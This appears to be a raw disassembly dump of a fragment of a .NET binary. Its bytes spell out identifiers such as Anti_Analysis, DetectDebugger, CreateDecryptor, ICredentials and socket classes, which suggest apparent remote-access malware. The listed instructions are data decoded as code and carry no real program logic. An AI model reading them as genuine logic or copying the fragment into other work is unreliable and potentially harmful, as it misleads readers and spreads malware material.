  408b92:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408b99:	65 
  408b9a:	72 00                	jb     0x408b9c
  408b9c:	47                   	inc    %edi
  408b9d:	65 74 45             	gs je  0x408be5
  408ba0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba1:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ba4:	65 72 00             	gs jb  0x408ba7
  408ba7:	67 65 74 5f          	addr16 gs je 0x408c0a
  408bab:	42                   	inc    %edx
  408bac:	75 66                	jne    0x408c14
  408bae:	66 65 72 00          	data16 gs jb 0x408bb2
  408bb2:	73 65                	jae    0x408c19
  408bb4:	74 5f                	je     0x408c15
  408bb6:	42                   	inc    %edx
  408bb7:	75 66                	jne    0x408c1f
  408bb9:	66 65 72 00          	data16 gs jb 0x408bbd
  408bbd:	57                   	push   %edi
  408bbe:	72 69                	jb     0x408c29
  408bc0:	74 65                	je     0x408c27
  408bc2:	49                   	dec    %ecx
  408bc3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc4:	74 65                	je     0x408c2b
  408bc6:	67 65 72 00          	addr16 gs jb 0x408bca
  408bca:	67 65 74 5f          	addr16 gs je 0x408c2d
  408bce:	41                   	inc    %ecx
  408bcf:	73 49                	jae    0x408c1a
  408bd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd2:	74 65                	je     0x408c39
  408bd4:	67 65 72 00          	addr16 gs jb 0x408bd8
  408bd8:	73 65                	jae    0x408c3f
  408bda:	74 5f                	je     0x408c3b
  408bdc:	41                   	inc    %ecx
  408bdd:	73 49                	jae    0x408c28
  408bdf:	6e                   	outsb  %ds:(%esi),(%dx)
  408be0:	74 65                	je     0x408c47
  408be2:	67 65 72 00          	addr16 gs jb 0x408be6
  408be6:	47                   	inc    %edi
  408be7:	65 74 41             	gs je  0x408c2b
  408bea:	73 49                	jae    0x408c35
  408bec:	6e                   	outsb  %ds:(%esi),(%dx)
  408bed:	74 65                	je     0x408c54
  408bef:	67 65 72 00          	addr16 gs jb 0x408bf3
  408bf3:	53                   	push   %ebx
  408bf4:	65 74 41             	gs je  0x408c38
  408bf7:	73 49                	jae    0x408c42
  408bf9:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfa:	74 65                	je     0x408c61
  408bfc:	67 65 72 00          	addr16 gs jb 0x408c00
  408c00:	44                   	inc    %esp
  408c01:	65 74 65             	gs je  0x408c69
  408c04:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c08:	62 75 67             	bound  %esi,0x67(%ebp)
  408c0b:	67 65 72 00          	addr16 gs jb 0x408c0f
  408c0f:	4d                   	dec    %ebp
  408c10:	61                   	popa
  408c11:	6e                   	outsb  %ds:(%esi),(%dx)
  408c12:	61                   	popa
  408c13:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c16:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c18:	74 4f                	je     0x408c69
  408c1a:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c1d:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c21:	61                   	popa
  408c22:	72 63                	jb     0x408c87
  408c24:	68 65 72 00 53       	push   $0x53007265
  408c29:	65 73 73             	gs jae 0x408c9f
  408c2c:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c33:	6e                   	outsb  %ds:(%esi),(%dx)
  408c34:	67 45                	addr16 inc %ebp
  408c36:	76 65                	jbe    0x408c9d
  408c38:	6e                   	outsb  %ds:(%esi),(%dx)
  408c39:	74 48                	je     0x408c83
  408c3b:	61                   	popa
  408c3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3d:	64 6c                	fs insb (%dx),%es:(%edi)
  408c3f:	65 72 00             	gs jb  0x408c42
  408c42:	54                   	push   %esp
  408c43:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4b:	65 72 00             	gs jb  0x408c4e
  408c4e:	43                   	inc    %ebx
  408c4f:	6c                   	insb   (%dx),%es:(%edi)
  408c50:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c57:	6c                   	insb   (%dx),%es:(%edi)
  408c58:	70 65                	jo     0x408cbf
  408c5a:	72 00                	jb     0x408c5c
  408c5c:	54                   	push   %esp
  408c5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c5e:	55                   	push   %ebp
  408c5f:	70 70                	jo     0x408cd1
  408c61:	65 72 00             	gs jb  0x408c64
  408c64:	44                   	inc    %esp
  408c65:	65 74 65             	gs je  0x408ccd
  408c68:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6d:	75 66                	jne    0x408cd5
  408c6f:	61                   	popa
  408c70:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c74:	65 72 00             	gs jb  0x408c77
  408c77:	43                   	inc    %ebx
  408c78:	75 72                	jne    0x408cec
  408c7a:	72 65                	jb     0x408ce1
  408c7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7d:	74 55                	je     0x408cd4
  408c7f:	73 65                	jae    0x408ce6
  408c81:	72 00                	jb     0x408c83
  408c83:	53                   	push   %ebx
  408c84:	74 72                	je     0x408cf8
  408c86:	65 61                	gs popa
  408c88:	6d                   	insl   (%dx),%es:(%edi)
  408c89:	57                   	push   %edi
  408c8a:	72 69                	jb     0x408cf5
  408c8c:	74 65                	je     0x408cf3
  408c8e:	72 00                	jb     0x408c90
  408c90:	54                   	push   %esp
  408c91:	65 78 74             	gs js  0x408d08
  408c94:	57                   	push   %edi
  408c95:	72 69                	jb     0x408d00
  408c97:	74 65                	je     0x408cfe
  408c99:	72 00                	jb     0x408c9b
  408c9b:	45                   	inc    %ebp
  408c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9d:	74 65                	je     0x408d04
  408c9f:	72 00                	jb     0x408ca1
  408ca1:	42                   	inc    %edx
  408ca2:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408ca9:	72 
  408caa:	74 65                	je     0x408d11
  408cac:	72 00                	jb     0x408cae
  408cae:	54                   	push   %esp
  408caf:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb0:	4c                   	dec    %esp
  408cb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb2:	77 65                	ja     0x408d19
  408cb4:	72 00                	jb     0x408cb6
  408cb6:	45                   	inc    %ebp
  408cb7:	72 72                	jb     0x408d2b
  408cb9:	6f                   	outsl  %ds:(%esi),(%dx)
  408cba:	72 00                	jb     0x408cbc
  408cbc:	49                   	dec    %ecx
  408cbd:	45                   	inc    %ebp
  408cbe:	6e                   	outsb  %ds:(%esi),(%dx)
  408cbf:	75 6d                	jne    0x408d2e
  408cc1:	65 72 61             	gs jb  0x408d25
  408cc4:	74 6f                	je     0x408d35
  408cc6:	72 00                	jb     0x408cc8
  408cc8:	4d                   	dec    %ebp
  408cc9:	61                   	popa
  408cca:	6e                   	outsb  %ds:(%esi),(%dx)
  408ccb:	61                   	popa
  408ccc:	67 65 6d             	gs insl (%dx),%es:(%di)
  408ccf:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd1:	74 4f                	je     0x408d22
  408cd3:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cd6:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cda:	75 6d                	jne    0x408d49
  408cdc:	65 72 61             	gs jb  0x408d40
  408cdf:	74 6f                	je     0x408d50
  408ce1:	72 00                	jb     0x408ce3
  408ce3:	53                   	push   %ebx
  408ce4:	79 73                	jns    0x408d59
  408ce6:	74 65                	je     0x408d4d
  408ce8:	6d                   	insl   (%dx),%es:(%edi)
  408ce9:	2e 43                	cs inc %ebx
  408ceb:	6f                   	outsl  %ds:(%esi),(%dx)
  408cec:	6c                   	insb   (%dx),%es:(%edi)
  408ced:	6c                   	insb   (%dx),%es:(%edi)
  408cee:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf4:	73 2e                	jae    0x408d24
  408cf6:	49                   	dec    %ecx
  408cf7:	45                   	inc    %ebp
  408cf8:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf9:	75 6d                	jne    0x408d68
  408cfb:	65 72 61             	gs jb  0x408d5f
  408cfe:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d02:	47                   	inc    %edi
  408d03:	65 74 45             	gs je  0x408d4b
  408d06:	6e                   	outsb  %ds:(%esi),(%dx)
  408d07:	75 6d                	jne    0x408d76
  408d09:	65 72 61             	gs jb  0x408d6d
  408d0c:	74 6f                	je     0x408d7d
  408d0e:	72 00                	jb     0x408d10
  408d10:	41                   	inc    %ecx
  408d11:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d15:	61                   	popa
  408d16:	74 6f                	je     0x408d87
  408d18:	72 00                	jb     0x408d1a
  408d1a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d1f:	00 2e                	add    %ch,(%esi)
  408d21:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d24:	6f                   	outsl  %ds:(%esi),(%dx)
  408d25:	72 00                	jb     0x408d27
  408d27:	4d                   	dec    %ebp
  408d28:	6f                   	outsl  %ds:(%esi),(%dx)
  408d29:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2a:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d31:	65 
  408d32:	61                   	popa
  408d33:	74 65                	je     0x408d9a
  408d35:	44                   	inc    %esp
  408d36:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d3a:	70 74                	jo     0x408db0
  408d3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d3d:	72 00                	jb     0x408d3f
  408d3f:	43                   	inc    %ebx
  408d40:	72 65                	jb     0x408da7
  408d42:	61                   	popa
  408d43:	74 65                	je     0x408daa
  408d45:	45                   	inc    %ebp
  408d46:	6e                   	outsb  %ds:(%esi),(%dx)
  408d47:	63 72 79             	arpl   %esi,0x79(%edx)
  408d4a:	70 74                	jo     0x408dc0
  408d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4d:	72 00                	jb     0x408d4f
  408d4f:	49                   	dec    %ecx
  408d50:	6e                   	outsb  %ds:(%esi),(%dx)
  408d51:	74 50                	je     0x408da3
  408d53:	74 72                	je     0x408dc7
  408d55:	00 53 79             	add    %dl,0x79(%ebx)
  408d58:	73 74                	jae    0x408dce
  408d5a:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5c:	2e 44                	cs inc %esp
  408d5e:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d65:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d6c:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d73:	6f                   	outsl  %ds:(%esi),(%dx)
  408d74:	64 73 00             	fs jae 0x408d77
  408d77:	4d                   	dec    %ebp
  408d78:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d7f:	74 2e                	je     0x408daf
  408d81:	56                   	push   %esi
  408d82:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d89:	73 69                	jae    0x408df4
  408d8b:	63 2e                	arpl   %ebp,(%esi)
  408d8d:	44                   	inc    %esp
  408d8e:	65 76 69             	gs jbe 0x408dfa
  408d91:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d94:	00 53 79             	add    %dl,0x79(%ebx)
  408d97:	73 74                	jae    0x408e0d
  408d99:	65 6d                	gs insl (%dx),%es:(%edi)
  408d9b:	2e 52                	cs push %edx
  408d9d:	75 6e                	jne    0x408e0d
  408d9f:	74 69                	je     0x408e0a
  408da1:	6d                   	insl   (%dx),%es:(%edi)
  408da2:	65 2e 49             	gs cs dec %ecx
  408da5:	6e                   	outsb  %ds:(%esi),(%dx)
  408da6:	74 65                	je     0x408e0d
  408da8:	72 6f                	jb     0x408e19
  408daa:	70 53                	jo     0x408dff
  408dac:	65 72 76             	gs jb  0x408e25
  408daf:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408db6:	73 74                	jae    0x408e2c
  408db8:	65 6d                	gs insl (%dx),%es:(%edi)
  408dba:	2e 52                	cs push %edx
  408dbc:	75 6e                	jne    0x408e2c
  408dbe:	74 69                	je     0x408e29
  408dc0:	6d                   	insl   (%dx),%es:(%edi)
  408dc1:	65 2e 43             	gs cs inc %ebx
  408dc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc5:	6d                   	insl   (%dx),%es:(%edi)
  408dc6:	70 69                	jo     0x408e31
  408dc8:	6c                   	insb   (%dx),%es:(%edi)
  408dc9:	65 72 53             	gs jb  0x408e1f
  408dcc:	65 72 76             	gs jb  0x408e45
  408dcf:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408dd6:	62 75 67             	bound  %esi,0x67(%ebp)
  408dd9:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de0:	65 
  408de1:	73 00                	jae    0x408de3
  408de3:	45                   	inc    %ebp
  408de4:	78 70                	js     0x408e56
  408de6:	61                   	popa
  408de7:	6e                   	outsb  %ds:(%esi),(%dx)
  408de8:	64 45                	fs inc %ebp
  408dea:	6e                   	outsb  %ds:(%esi),(%dx)
  408deb:	76 69                	jbe    0x408e56
  408ded:	72 6f                	jb     0x408e5e
  408def:	6e                   	outsb  %ds:(%esi),(%dx)
  408df0:	6d                   	insl   (%dx),%es:(%edi)
  408df1:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df3:	74 56                	je     0x408e4b
  408df5:	61                   	popa
  408df6:	72 69                	jb     0x408e61
  408df8:	61                   	popa
  408df9:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408dfd:	00 47 65             	add    %al,0x65(%edi)
  408e00:	74 50                	je     0x408e52
  408e02:	72 6f                	jb     0x408e73
  408e04:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e07:	73 65                	jae    0x408e6e
  408e09:	73 00                	jae    0x408e0b
  408e0b:	47                   	inc    %edi
  408e0c:	65 74 48             	gs je  0x408e57
  408e0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e10:	73 74                	jae    0x408e86
  408e12:	41                   	inc    %ecx
  408e13:	64 64 72 65          	fs fs jb 0x408e7c
  408e17:	73 73                	jae    0x408e8c
  408e19:	65 73 00             	gs jae 0x408e1c
  408e1c:	53                   	push   %ebx
  408e1d:	79 73                	jns    0x408e92
  408e1f:	74 65                	je     0x408e86
  408e21:	6d                   	insl   (%dx),%es:(%edi)
  408e22:	2e 53                	cs push %ebx
  408e24:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e28:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e2f:	70 
  408e30:	74 6f                	je     0x408ea1
  408e32:	67 72 61             	addr16 jb 0x408e96
  408e35:	70 68                	jo     0x408e9f
  408e37:	79 2e                	jns    0x408e67
  408e39:	58                   	pop    %eax
  408e3a:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e3f:	72 74                	jb     0x408eb5
  408e41:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e48:	73 00                	jae    0x408e4a
  408e4a:	45                   	inc    %ebp
  408e4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e4f:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e53:	74 65                	je     0x408eba
  408e55:	73 00                	jae    0x408e57
  408e57:	47                   	inc    %edi
  408e58:	65 74 55             	gs je  0x408eb0
  408e5b:	74 66                	je     0x408ec3
  408e5d:	38 42 79             	cmp    %al,0x79(%edx)
  408e60:	74 65                	je     0x408ec7
  408e62:	73 00                	jae    0x408e64
  408e64:	75 74                	jne    0x408eda
  408e66:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e6a:	74 65                	je     0x408ed1
  408e6c:	73 00                	jae    0x408e6e
  408e6e:	52                   	push   %edx
  408e6f:	66 63 32             	arpl   %si,(%edx)
  408e72:	38 39                	cmp    %bh,(%ecx)
  408e74:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e78:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e7f:	73 00                	jae    0x408e81
  408e81:	52                   	push   %edx
  408e82:	65 61                	gs popa
  408e84:	64 41                	fs inc %ecx
  408e86:	6c                   	insb   (%dx),%es:(%edi)
  408e87:	6c                   	insb   (%dx),%es:(%edi)
  408e88:	42                   	inc    %edx
  408e89:	79 74                	jns    0x408eff
  408e8b:	65 73 00             	gs jae 0x408e8e
  408e8e:	44                   	inc    %esp
  408e8f:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e93:	65 46                	gs inc %esi
  408e95:	72 6f                	jb     0x408f06
  408e97:	6d                   	insl   (%dx),%es:(%edi)
  408e98:	42                   	inc    %edx
  408e99:	79 74                	jns    0x408f0f
  408e9b:	65 73 00             	gs jae 0x408e9e
  408e9e:	53                   	push   %ebx
  408e9f:	77 61                	ja     0x408f02
  408ea1:	70 42                	jo     0x408ee5
  408ea3:	79 74                	jns    0x408f19
  408ea5:	65 73 00             	gs jae 0x408ea8
  408ea8:	4c                   	dec    %esp
  408ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  408eaa:	61                   	popa
  408eab:	64 46                	fs inc %esi
  408ead:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408eb4:	74 
  408eb5:	65 73 00             	gs jae 0x408eb8
  408eb8:	47                   	inc    %edi
  408eb9:	65 74 41             	gs je  0x408efd
  408ebc:	73 42                	jae    0x408f00
  408ebe:	79 74                	jns    0x408f34
  408ec0:	65 73 00             	gs jae 0x408ec3
  408ec3:	53                   	push   %ebx
  408ec4:	65 74 41             	gs je  0x408f08
  408ec7:	73 42                	jae    0x408f0b
  408ec9:	79 74                	jns    0x408f3f
  408ecb:	65 73 00             	gs jae 0x408ece
  408ece:	47                   	inc    %edi
  408ecf:	65 74 42             	gs je  0x408f14
  408ed2:	79 74                	jns    0x408f48
  408ed4:	65 73 00             	gs jae 0x408ed7
  408ed7:	72 61                	jb     0x408f3a
  408ed9:	77 42                	ja     0x408f1d
  408edb:	79 74                	jns    0x408f51
  408edd:	65 73 00             	gs jae 0x408ee0
  408ee0:	62 79 74             	bound  %edi,0x74(%ecx)
  408ee3:	65 73 00             	gs jae 0x408ee6
  408ee6:	43                   	inc    %ebx
  408ee7:	53                   	push   %ebx
  408ee8:	68 61 72 70 41       	push   $0x41707261
  408eed:	72 67                	jb     0x408f56
  408eef:	75 6d                	jne    0x408f5e
  408ef1:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef3:	74 49                	je     0x408f3e
  408ef5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef6:	66 6f                	outsw  %ds:(%esi),(%dx)
  408ef8:	46                   	inc    %esi
  408ef9:	6c                   	insb   (%dx),%es:(%edi)
  408efa:	61                   	popa
  408efb:	67 73 00             	addr16 jae 0x408efe
  408efe:	43                   	inc    %ebx
  408eff:	53                   	push   %ebx
  408f00:	68 61 72 70 42       	push   $0x42707261
  408f05:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f0c:	61                   	popa
  408f0d:	67 73 00             	addr16 jae 0x408f10
  408f10:	65 73 46             	gs jae 0x408f59
  408f13:	6c                   	insb   (%dx),%es:(%edi)
  408f14:	61                   	popa
  408f15:	67 73 00             	addr16 jae 0x408f18
  408f18:	53                   	push   %ebx
  408f19:	74 72                	je     0x408f8d
  408f1b:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f22:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f29:	65 
  408f2a:	53                   	push   %ebx
  408f2b:	65 74 74             	gs je  0x408fa2
  408f2e:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f35:	73 73                	jae    0x408faa
  408f37:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f3f:	67 45                	addr16 inc %ebp
  408f41:	76 65                	jbe    0x408fa8
  408f43:	6e                   	outsb  %ds:(%esi),(%dx)
  408f44:	74 41                	je     0x408f87
  408f46:	72 67                	jb     0x408faf
  408f48:	73 00                	jae    0x408f4a
  408f4a:	41                   	inc    %ecx
  408f4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4c:	74 69                	je     0x408fb7
  408f4e:	5f                   	pop    %edi
  408f4f:	41                   	inc    %ecx
  408f50:	6e                   	outsb  %ds:(%esi),(%dx)
  408f51:	61                   	popa
  408f52:	6c                   	insb   (%dx),%es:(%edi)
  408f53:	79 73                	jns    0x408fc8
  408f55:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5d:	74 69                	je     0x408fc8
  408f5f:	41                   	inc    %ecx
  408f60:	6e                   	outsb  %ds:(%esi),(%dx)
  408f61:	61                   	popa
  408f62:	6c                   	insb   (%dx),%es:(%edi)
  408f63:	79 73                	jns    0x408fd8
  408f65:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f6c:	73 00                	jae    0x408f6e
  408f6e:	49                   	dec    %ecx
  408f6f:	43                   	inc    %ebx
  408f70:	72 65                	jb     0x408fd7
  408f72:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f75:	74 69                	je     0x408fe0
  408f77:	61                   	popa
  408f78:	6c                   	insb   (%dx),%es:(%edi)
  408f79:	73 00                	jae    0x408f7b
  408f7b:	73 65                	jae    0x408fe2
  408f7d:	74 5f                	je     0x408fde
  408f7f:	43                   	inc    %ebx
  408f80:	72 65                	jb     0x408fe7
  408f82:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f85:	74 69                	je     0x408ff0
  408f87:	61                   	popa
  408f88:	6c                   	insb   (%dx),%es:(%edi)
  408f89:	73 00                	jae    0x408f8b
  408f8b:	45                   	inc    %ebp
  408f8c:	71 75                	jno    0x409003
  408f8e:	61                   	popa
  408f8f:	6c                   	insb   (%dx),%es:(%edi)
  408f90:	73 00                	jae    0x408f92
  408f92:	53                   	push   %ebx
  408f93:	73 6c                	jae    0x409001
  408f95:	50                   	push   %eax
  408f96:	72 6f                	jb     0x409007
  408f98:	74 6f                	je     0x409009
  408f9a:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408f9d:	73 00                	jae    0x408f9f
  408f9f:	52                   	push   %edx
  408fa0:	65 61                	gs popa
  408fa2:	64 54                	fs push %esp
  408fa4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa6:	6c                   	insb   (%dx),%es:(%edi)
  408fa7:	73 00                	jae    0x408fa9
  408fa9:	57                   	push   %edi
  408faa:	72 69                	jb     0x409015
  408fac:	74 65                	je     0x409013
  408fae:	54                   	push   %esp
  408faf:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb1:	6c                   	insb   (%dx),%es:(%edi)
  408fb2:	73 00                	jae    0x408fb4
  408fb4:	42                   	inc    %edx
  408fb5:	79 74                	jns    0x40902b
  408fb7:	65 73 54             	gs jae 0x40900e
  408fba:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbc:	6c                   	insb   (%dx),%es:(%edi)
  408fbd:	73 00                	jae    0x408fbf
  408fbf:	53                   	push   %ebx
  408fc0:	79 73                	jns    0x409035
  408fc2:	74 65                	je     0x409029
  408fc4:	6d                   	insl   (%dx),%es:(%edi)
  408fc5:	2e 57                	cs push %edi
  408fc7:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fce:	46                   	inc    %esi
  408fcf:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd0:	72 6d                	jb     0x40903f
  408fd2:	73 00                	jae    0x408fd4
  408fd4:	44                   	inc    %esp
  408fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd6:	73 00                	jae    0x408fd8
  408fd8:	43                   	inc    %ebx
  408fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fda:	6e                   	outsb  %ds:(%esi),(%dx)
  408fdb:	74 61                	je     0x40903e
  408fdd:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fe4:	74 65                	je     0x40904b
  408fe6:	6d                   	insl   (%dx),%es:(%edi)
  408fe7:	2e 43                	cs inc %ebx
  408fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fea:	6c                   	insb   (%dx),%es:(%edi)
  408feb:	6c                   	insb   (%dx),%es:(%edi)
  408fec:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff2:	73 00                	jae    0x408ff4
  408ff4:	53                   	push   %ebx
  408ff5:	74 72                	je     0x409069
  408ff7:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  408ffe:	74 4f                	je     0x40904f
  409000:	70 74                	jo     0x409076
  409002:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409009:	74 49                	je     0x409054
  40900b:	6d                   	insl   (%dx),%es:(%edi)
  40900c:	61                   	popa
  40900d:	67 65 44             	addr16 gs inc %esp
  409010:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409014:	65 72 73             	gs jb  0x40908a
  409017:	00 52 75             	add    %dl,0x75(%edx)
  40901a:	6e                   	outsb  %ds:(%esi),(%dx)
  40901b:	74 69                	je     0x409086
  40901d:	6d                   	insl   (%dx),%es:(%edi)
  40901e:	65 48                	gs dec %eax
  409020:	65 6c                	gs insb (%dx),%es:(%edi)
  409022:	70 65                	jo     0x409089
  409024:	72 73                	jb     0x409099
  409026:	00 53 73             	add    %dl,0x73(%ebx)
  409029:	6c                   	insb   (%dx),%es:(%edi)
  40902a:	50                   	push   %eax
  40902b:	6f                   	outsl  %ds:(%esi),(%dx)
  40902c:	6c                   	insb   (%dx),%es:(%edi)
  40902d:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409034:	72 73                	jb     0x4090a9
  409036:	00 73 73             	add    %dh,0x73(%ebx)
  409039:	6c                   	insb   (%dx),%es:(%edi)
  40903a:	50                   	push   %eax
  40903b:	6f                   	outsl  %ds:(%esi),(%dx)
  40903c:	6c                   	insb   (%dx),%es:(%edi)
  40903d:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409044:	72 73                	jb     0x4090b9
  409046:	00 46 69             	add    %al,0x69(%esi)
  409049:	6c                   	insb   (%dx),%es:(%edi)
  40904a:	65 41                	gs inc %ecx
  40904c:	63 63 65             	arpl   %esp,0x65(%ebx)
  40904f:	73 73                	jae    0x4090c4
  409051:	00 68 50             	add    %ch,0x50(%eax)
  409054:	72 6f                	jb     0x4090c5
  409056:	63 65 73             	arpl   %esp,0x73(%ebp)
  409059:	73 00                	jae    0x40905b
  40905b:	47                   	inc    %edi
  40905c:	65 74 43             	gs je  0x4090a2
  40905f:	75 72                	jne    0x4090d3
  409061:	72 65                	jb     0x4090c8
  409063:	6e                   	outsb  %ds:(%esi),(%dx)
  409064:	74 50                	je     0x4090b6
  409066:	72 6f                	jb     0x4090d7
  409068:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906b:	73 00                	jae    0x40906d
  40906d:	49                   	dec    %ecx
  40906e:	50                   	push   %eax
  40906f:	41                   	inc    %ecx
  409070:	64 64 72 65          	fs fs jb 0x4090d9
  409074:	73 73                	jae    0x4090e9
  409076:	00 43 6f             	add    %al,0x6f(%ebx)
  409079:	6d                   	insl   (%dx),%es:(%edi)
  40907a:	70 72                	jo     0x4090ee
  40907c:	65 73 73             	gs jae 0x4090f2
  40907f:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409083:	6f                   	outsl  %ds:(%esi),(%dx)
  409084:	6d                   	insl   (%dx),%es:(%edi)
  409085:	70 72                	jo     0x4090f9
  409087:	65 73 73             	gs jae 0x4090fd
  40908a:	00 53 79             	add    %dl,0x79(%ebx)
  40908d:	73 74                	jae    0x409103
  40908f:	65 6d                	gs insl (%dx),%es:(%edi)
  409091:	2e 4e                	cs dec %esi
  409093:	65 74 2e             	gs je  0x4090c4
  409096:	53                   	push   %ebx
  409097:	6f                   	outsl  %ds:(%esi),(%dx)
  409098:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40909b:	74 73                	je     0x409110
  40909d:	00 73 65             	add    %dh,0x65(%ebx)
  4090a0:	74 5f                	je     0x409101
  4090a2:	41                   	inc    %ecx
  4090a3:	72 67                	jb     0x40910c
  4090a5:	75 6d                	jne    0x409114
  4090a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090a9:	74 73                	je     0x40911e
